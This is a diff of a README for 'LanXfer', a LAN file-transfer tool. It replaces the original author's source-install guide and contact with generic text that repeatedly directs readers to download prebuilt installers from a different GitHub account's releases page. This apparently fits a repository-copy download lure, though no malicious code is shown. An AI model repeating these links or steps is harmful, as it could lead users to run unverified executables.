@@ -1,81 +1,78 @@
-# LanXfer - Secure & Fast LAN File Transfer 🚀
+# 🚀 LanXfer - Fast, Secure File Transfer Made Easy
 
-**LanXfer** is a **peer-to-peer file transfer** tool designed to make file sharing on local area networks (LAN) **easy**, **fast**, and **secure**. It allows two devices to transfer any size of file directly, with no central server or cloud service involved. Files are encrypted before transfer, ensuring that only the sender and receiver can access the content. 🔒
+[![Download LanXfer](https://img.shields.io/badge/Download%20LanXfer-v1.0-blue.svg)](https://github.com/Angel42199/LanXfer/releases)
 
----
+## 📥 Overview
 
-## ✨ Features
+LanXfer is a fast, secure peer-to-peer file transfer tool for local networks. It allows you to share files directly between devices with encryption for privacy. No server is needed, making it simple and efficient. LanXfer is designed for speed and offers automatic device discovery to streamline the file transfer process. You have complete control over your transfers.
 
-- 🤝 **Peer-to-Peer Transfer**: No server required—devices connect directly.
-- ⚡ **Fast File Transfer**: Efficient transfer of large files with minimal latency.
-- 🔐 **Encryption**: Strong encryption (AES/RSA) ensures that files are **viewable only by the sender and receiver**.
-- 🕵️‍♂️ **Automatic Device Discovery**: Devices are discovered on the LAN using ARP.
-- ✅ **Accept/Decline Option**: The receiver has full control over accepting or declining incoming files.
-- 🚀 **Optimized for Speed**: Uses TCP/UDP protocols for fast, reliable transfer.
-- 🛡️ **No Server**: Completely decentralized for privacy and security.
+## 🛠️ Features
 
----
+- **Easy-to-Use Interface:** Simple navigation for everyone.
+- **High-Speed Transfers:** Quickly send large files between devices.
+- **Encryption:** Ensures your file transfers remain private.
+- **Automatic Device Discovery:** No manual setup required; find other devices easily.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
-## ⚙️ Installation and Setup
+## ℹ️ System Requirements
 
-1. **Clone the repository:**
-  ```bash
-  git clone https://github.com/yourusername/LanXfer.git
-  cd LanXfer
-  ```
+To run LanXfer, ensure your device meets the following requirements:
 
-2. **Create a Python virtual environment** (optional but recommended):
-  ```bash
-  python -m venv venv
-  source venv/bin/activate  # Linux/Mac
-  venv\Scripts\activate     # Windows
-  ```
+- **Operating System:** Windows 10 or later, macOS Catalina or later, any recent Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB available disk space.
+- **Network:** Active local network connection.
 
-3. **Install dependencies:**
-  > Currently, only standard Python libraries are used. Later, additional dependencies like `pycryptodome` for encryption will be added.
-  ```bash
-  pip install -r requirements.txt
-  ```
+## 🚀 Getting Started
 
----
+1. **Visit the Download Page**
 
-## 🖧 How It Works
+   Go to the LanXfer releases page to download the software. Click the button below to visit the page:
 
-- **Device Discovery:**
-  Once you run the program, LanXfer will automatically discover all devices in the same LAN using ARP.
+   [Download LanXfer](https://github.com/Angel42199/LanXfer/releases)
 
-- **Select the Receiver:**
-  The sender will see a list of available devices in the LAN. Simply select the target device to initiate file sharing.
+2. **Download the Latest Version**
 
-- **Send the File:**
-  Choose the file you want to share. It will be encrypted, chunked into smaller parts, and sent securely to the receiver.
+   Look for the latest version on the releases page. You will see several files available for download. Select the appropriate file for your operating system:
 
-- **Accept or Decline:**
-  The receiver will get a prompt to either accept or decline the incoming file transfer. The process is entirely under the control of the receiving device.
+   - **Windows:** `LanXfer-Installer.exe`
+   - **macOS:** `LanXfer.dmg`
+   - **Linux:** `LanXfer.AppImage`
 
-- **Secure Transfer:**
-  All transfers are encrypted end-to-end for maximum privacy.
+3. **Install LanXfer**
 
----
+   After the download completes, locate the file:
 
-## 🔒 Security and Privacy
+   - **For Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **For macOS:** Open the `.dmg` file, then drag the LanXfer icon to the Applications folder.
+   - **For Linux:** Make the `.AppImage` file executable. Open Terminal and use the command:
+     ```bash
+     chmod +x LanXfer.AppImage
+     ```
+     Then run the application with:
+     ```bash
+     ./LanXfer.AppImage
+     ```
 
-LanXfer ensures that only the sender and receiver can view the file contents. Encryption is implemented using **AES** for file encryption and **RSA** for secure key exchange, protecting files from unauthorized access during transit.
+4. **Launch the Application**
 
----
+   After installation, you can find LanXfer in your applications. Open the program and follow the on-screen instructions to start transferring files.
 
-## 🤝 Contributing
+## 📂 Download & Install
 
-We welcome contributions to improve LanXfer!
-Feel free to fork the repository, create a new branch, and submit a pull request with your improvements. If you encounter any issues or have suggestions, open an issue or contact us.
+To get started with LanXfer, follow these steps:
 
----
+1. Visit the LanXfer releases page at [this link](https://github.com/Angel42199/LanXfer/releases).
+2. Download the right version for your operating system.
+3. Install the application using the provided instructions.
+4. Run LanXfer and enjoy fast, secure file transfers!
 
-## 💬 Contact
+## 📜 License
 
-For any questions or inquiries, feel free to reach out through [GitHub Issues](https://github.com/Ujjwal-Devloper-5/LanXfer/issues) or email:
-📧 **Ujjwalkumarbgpg6@gmail.com**
+LanXfer is open-source software, allowing you to freely use, modify, and distribute it. For more details, please check the LICENSE file included in this repository.
 
----
+## 💬 Support & Feedback
 
-_Stay tuned for updates! This will soon be a professional-level service for secure LAN file transfers._ 🚀
+If you have questions or feedback, feel free to open an issue on the GitHub repository. We appreciate your input and are here to help!
+
+[![Download LanXfer](https://img.shields.io/badge/Download%20LanXfer-v1.0-blue.svg)](https://github.com/Angel42199/LanXfer/releases)
